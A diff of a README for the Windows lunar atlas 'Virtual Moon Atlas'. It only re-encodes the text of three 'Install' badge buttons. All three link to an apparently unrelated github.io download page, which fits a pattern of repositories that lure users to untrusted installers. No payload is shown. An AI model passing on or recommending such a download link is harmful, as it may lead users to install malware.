@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Virtual Moon Atlas](https://img.shields.io/badge/⬇_Install_Virtual%20Moon%20Atlas-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Virtual Moon Atlas](https://img.shields.io/badge/⬇_Install_Virtual+Moon+Atlas-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Virtual Moon Atlas is a free, detailed lunar atlas for Windows that provides hig
 
 <div align="center">
 
-[![⬇ Install Virtual Moon Atlas](https://img.shields.io/badge/⬇_Install_Virtual%20Moon%20Atlas-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Virtual Moon Atlas](https://img.shields.io/badge/⬇_Install_Virtual+Moon+Atlas-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Virtual Moon Atlas is a free, detailed lunar atlas for Windows that provides hig
 
 <div align="center">
 
-[![⬇ Install Virtual Moon Atlas](https://img.shields.io/badge/⬇_Install_Virtual%20Moon%20Atlas-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Virtual Moon Atlas](https://img.shields.io/badge/⬇_Install_Virtual+Moon+Atlas-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
